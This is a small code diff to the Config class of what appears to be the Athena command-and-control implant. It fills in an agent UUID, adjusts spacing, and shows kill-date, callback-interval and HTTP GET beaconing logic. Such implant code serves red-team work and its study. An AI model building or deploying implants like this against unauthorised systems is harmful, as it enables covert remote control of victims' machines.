@@ -16,7 +16,7 @@ namespace Athena
 
         public Config()
         {
-            uuid = "%UUID%";
+            uuid = "17463c06-b0dd-4040-a7d3-1cc825051f55";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
@@ -118,7 +118,7 @@ namespace Athena
 
                 HttpResponseMessage response;
 
-                if(json.Length < 2000) //Max URL length
+                if (json.Length < 2000) //Max URL length
                 {
                     response = await this.client.GetAsync(this.getURL + json);
                 }
